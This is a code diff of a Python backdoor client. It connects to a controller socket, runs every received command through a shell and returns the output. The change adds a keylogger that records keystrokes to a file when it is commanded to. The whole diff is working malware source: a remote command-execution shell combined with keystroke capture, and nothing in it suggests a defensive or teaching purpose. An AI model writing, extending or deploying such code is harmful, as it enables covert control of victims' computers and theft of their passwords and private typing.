@@ -1,5 +1,5 @@
 import socket, time, subprocess
-import threading
+import threading, keylogger
 import _thread as thread
 import sys
 
@@ -14,11 +14,15 @@ def input_collection(sock):
         try:
             command = sock.recv(2048).decode()
             print(command)
-            thread_lock.acquire()
-            command_list.append(command)
-            thread_lock.release()
+            if command == 'keylogger':
+                keylogger.keylogger('log.txt')
+                sock.sendall('Keylogger active...'.encode())
+            else:
+                thread_lock.acquire()
+                command_list.append(command)
+                thread_lock.release()
         except socket.timeout:
-            print("RECEIVE TIMED OUT..")
+            print("RECEIVED TIMED OUT..")
             pass
         except:
             stop = True
@@ -35,11 +39,10 @@ def execute_commands(sock):
             if (len(command_list) > 0):
                 command = command_list.pop(0)
             thread_lock.release()
-
             if(command != None):
                 response = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                 data = response.stdout.read() + response.stderr.read()
-                print("response was: {}".format(data))
+                print("Response was: {}".format(data))
                 sock.sendall(data)
         except:
             print("ERROR IN EXECUTE_COMMANDS FUNCTION")
@@ -48,6 +51,7 @@ def execute_commands(sock):
 
 HOST = '127.0.0.1'
 PORT = 5001
+
 while(True):
     try:
         sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
